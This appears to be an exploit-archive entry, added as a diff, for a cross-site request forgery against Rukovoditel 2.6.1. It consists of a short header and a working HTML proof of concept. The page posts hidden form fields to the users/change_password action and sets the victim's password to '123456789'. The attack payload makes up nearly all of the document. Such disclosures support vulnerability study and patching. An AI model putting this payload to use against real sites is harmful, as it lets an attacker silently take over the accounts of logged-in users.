@@ -1,0 +1,30 @@
+# Exploit Title: Rukovoditel 2.6.1 - Cross-Site Request Forgery (Change 
+password)
+# Date: 2020-12-14
+# Exploit Author: KeopssGroup0day,Inc
+# Vendor Homepage: https://www.rukovoditel.net/
+# Software Link: https://www.rukovoditel.net/download.php
+# Version: v2.6.1
+# Tested on: Kali Linux
+
+POC(localhost/index.php?module=users/change_password):
+
+<html>
+   <!-- CSRF PoC  -->
+   <body>
+   <script>history.pushState('', '', '/')</script>
+     <form 
+action="https://localhost/index.php?module=users/change_password&action=change" 
+method="POST">
+       <input type="hidden" name="form&#95;session&#95;token" 
+value="D&#94;HUyTDh0X" />
+       <input type="hidden" name="password&#95;new" value="123456789" />
+       <input type="hidden" name="password&#95;confirmation" 
+value="123456789" />
+       <input type="submit" value="Submit request" />
+     </form>
+   </body>
+</html>
+
+
+--
